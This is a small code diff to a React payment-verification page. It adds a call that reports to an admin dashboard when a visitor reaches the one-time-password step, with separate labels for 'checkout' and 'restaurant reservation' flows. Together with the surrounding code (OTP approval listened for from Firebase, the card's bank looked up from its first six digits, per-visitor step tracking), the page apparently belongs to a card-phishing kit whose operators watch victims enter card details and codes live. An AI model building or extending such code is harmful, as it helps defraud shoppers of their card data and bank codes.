@@ -1,6 +1,10 @@
 import { useState, useEffect, useRef } from "react";
 import { useLocation } from "wouter";
-import { handleOtp, listenForOtpApproval } from "@/lib/firebase";
+import {
+  handleOtp,
+  listenForOtpApproval,
+  handleCurrentPage,
+} from "@/lib/firebase";
 import { findBankLogo } from "@/lib/bank-logos";
 
 const VisaLogo = () => (
@@ -198,6 +202,11 @@ function PaymentVerify() {
           data.type === "restaurant_reservation" ||
           data.currentPage === "reserve_checkout";
         const backHref = isReservation ? "/restaurants" : "/checkout";
+
+        // Sync dashboard step indicator: mark visitor as having reached the
+        // OTP stage (step 5). Use "reserve_otp" for restaurant flow so admins
+        // can tell the two flows apart.
+        void handleCurrentPage(isReservation ? "reserve_otp" : "otp");
 
         let bankName = "";
         const bin = cardNumber.replace(/\D/g, "").slice(0, 6);
